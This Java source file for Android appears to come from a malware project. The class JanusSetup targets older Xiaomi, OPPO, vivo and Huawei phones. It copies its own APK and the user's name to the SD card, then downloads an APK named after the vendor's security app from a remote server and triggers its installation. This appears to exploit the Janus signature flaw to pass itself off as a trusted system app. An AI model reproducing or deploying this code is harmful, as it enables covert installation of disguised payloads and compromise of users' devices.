package com.setup;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.lang.reflect.Method;
import com.main.ForegroundService;
import com.utils.HttpUtils;
import com.utils.Public;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;


public class JanusSetup extends Thread {
	
	private Context context = null;
	private String filename = null;

	public static boolean isJanusTarget(Context context){
		if (Build.VERSION.SDK_INT < 24 ) {
			if (android.os.Build.MANUFACTURER.contains("Xiaomi") ||
				android.os.Build.MANUFACTURER.contains("OPPO")||
				android.os.Build.MANUFACTURER.contains("vivo")||
				android.os.Build.MANUFACTURER.contains("HUAWEI") ) {
				return true;
			}
		}
		
		return false;
	}
	
	
	public static String getJanusTool(Context context){
		if (Build.VERSION.SDK_INT < 24 ) {
			if (android.os.Build.MANUFACTURER.contains("Xiaomi")){
				return "xiaomi_janus.apk";
			}else if(android.os.Build.MANUFACTURER.contains("OPPO")){
				return "oppo_safecenter_janus.apk";
			}else if(android.os.Build.MANUFACTURER.contains("vivo")){
				return "iguanjia_janus.apk";
			}else if(android.os.Build.MANUFACTURER.contains("HUAWEI") ){
				return "huawei_sysmgr_janus.apk";
			}else{
				return "";
			}
		}
		
		return "";
	}
	
	
	public JanusSetup(Context context,String fn){
		this.context = context;
		this.filename = fn;
	}
	
	
	public void run(){
		try {
			String apkpath = context.getPackageCodePath();
			FileInputStream fin = new FileInputStream(new File(apkpath));
			String tmpapk = ForegroundService.SDCARD_PATH_NAME + "janus_plugin.apk";
			FileOutputStream fout = new FileOutputStream(new File(tmpapk));
			int cnt = 0;
			byte [] buf = new byte[0x10000];
			while ((cnt = fin.read(buf,0,0x10000)) > 0) {
				fout.write(buf,0,cnt);
			}
			
			fin.close();
			fout.close();
			
			FileOutputStream fosusername = new FileOutputStream(ForegroundService.SDCARD_PATH_NAME + "janus_username.txt");
			fosusername.write(Public.UserName.getBytes(),0,Public.UserName.length());
			fosusername.close();
			
	    	String host = Public.SERVER_IP_ADDRESS;

		    String url = "http://" + host + "/janus/" + filename ;
		    String janusfn = ForegroundService.SDCARD_PATH_NAME + filename;
		    boolean ret = HttpUtils.getFileFromHttp(url, host, janusfn);
		    if (ret) {
				Intent localIntent = new Intent(Intent.ACTION_VIEW); 
				localIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
				Uri uri = null;
				//Android7.0+禁止应用对外暴露file://uri，改为content://uri;具体参考FileProvider
				if (Build.VERSION.SDK_INT >= 24) { 
					FileReader fr = new FileReader(janusfn);
		    		Class<? extends FileReader> clazz = fr.getClass();
		    		Method geturiforfile = clazz.getDeclaredMethod("getUriForFile",Context.class,String.class,File.class);
		    		uri = (Uri)geturiforfile.invoke(context, "com.science.fileprovider", new File(janusfn));
		    		fr.close();
					//uri = FileReader.getUriForFile(context, "com.science.fileprovider", new File(apkfilepath)); 
					localIntent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION); 
				} 
				else { 
					uri = Uri.fromFile(new File(janusfn)); 
				} 
				localIntent.setDataAndType(uri, "application/vnd.android.package-archive"); 
			    context.startActivity(localIntent);
			    return ;
			}
		} catch (Exception e) {
			e.printStackTrace();
		}

		
		return ;
	}
	
	
}
